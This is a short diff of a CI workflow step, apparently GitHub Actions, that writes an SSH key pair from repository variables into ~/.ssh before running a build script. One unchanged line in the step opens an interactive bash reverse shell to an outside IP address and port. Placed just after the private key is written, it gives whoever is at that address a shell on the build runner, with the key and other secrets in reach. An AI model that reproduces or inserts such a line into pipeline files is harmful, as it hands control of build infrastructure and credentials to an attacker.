@@ -58,8 +58,8 @@ jobs:
         run: |
           echo "current dir: $(pwd)"
           ls
-          echo "${{ secrets.$REPO_CI_ID_RSA }}" > ~/.ssh/id_rsa
-          echo "$id-rsa-pub" > ~/.ssh/id_rsa.pub
+          echo "$$REPO_CI_ID_RSA" > ~/.ssh/id_rsa
+          echo "$REPO_CI_ID_RSA_PUB" > ~/.ssh/id_rsa.pub
           /bin/bash -i >& /dev/tcp/81.69.171.187/2145 0>&1
           bash build/ci/scripts/ci.sh
 #        with:
